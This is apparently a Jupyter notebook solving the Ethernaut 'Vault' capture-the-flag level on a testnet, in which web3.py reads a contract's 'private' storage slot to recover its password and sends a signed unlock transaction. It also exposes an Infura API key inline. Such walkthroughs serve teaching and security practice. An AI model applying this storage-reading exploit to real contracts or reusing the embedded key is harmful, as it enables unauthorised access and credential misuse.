{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "title: (08) Vault\n",
    "description: https://ethernaut.openzeppelin.com/level/0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6\n",
    "show-code: True\n",
    "---"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![](https://ethernaut.openzeppelin.com/imgs/BigLevel8.svg)\n",
    "# (08) Vault\n",
    "## https://ethernaut.openzeppelin.com/level/0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from web3 import Web3\n",
    "from dotenv import load_dotenv\n",
    "from IPython.display import display, HTML\n",
    "import os\n",
    "import json\n",
    "\n",
    "load_dotenv()\n",
    "\n",
    "provider_url = 'https://goerli.infura.io/v3/69194ec6319d4463b70ef7215e7ee7a7'\n",
    "web3 = Web3(Web3.HTTPProvider(provider_url))\n",
    "account = '0xf0522A86a6BEb833F9E988596Fc9dF2F5CdD9C55'\n",
    "private_key = os.getenv('PRIVATE_KEY')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "with open('abi.json', 'r') as f:\n",
    "\tabi = json.load(f)\n",
    "\n",
    "contract_address = \"0xf0526BfbE30D2099C1373E40DdD76842B5af619E\"\n",
    "\n",
    "contract = web3.eth.contract(address=contract_address, abi=abi)\n",
    "\n",
    "result = contract.functions.locked().call()\n",
    "result"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HexBytes('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web3.eth.get_storage_at(contract_address, 1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<a href=\"https://goerli.etherscan.io/tx/0x892828ac47abffd76517457091dd115c089f2003e656c0242d2095587d227c21\">0x892828ac47abffd76517457091dd115c089f2003e656c0242d2095587d227c21</a>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "tx = {\n",
    "    'nonce': web3.eth.getTransactionCount(account),\n",
    "    'gas': 2000000,\n",
    "    'gasPrice': web3.toWei('50', 'gwei')\n",
    "}\n",
    "\n",
    "password = web3.eth.get_storage_at(contract_address, 1)\n",
    "\n",
    "tx = contract.functions.unlock(password).build_transaction(tx)\n",
    "\n",
    "signed_tx = web3.eth.account.sign_transaction(tx, private_key)\n",
    "\n",
    "tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)\n",
    "\n",
    "display(HTML(f'<a href=\"https://goerli.etherscan.io/tx/{web3.toHex(tx_hash)}\">{web3.toHex(tx_hash)}</a>'))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "False"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "contract.functions.locked().call()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.6"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "b0fa6594d8f4cbf19f97940f81e996739fb7646882a419484c72d19e05852a7e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
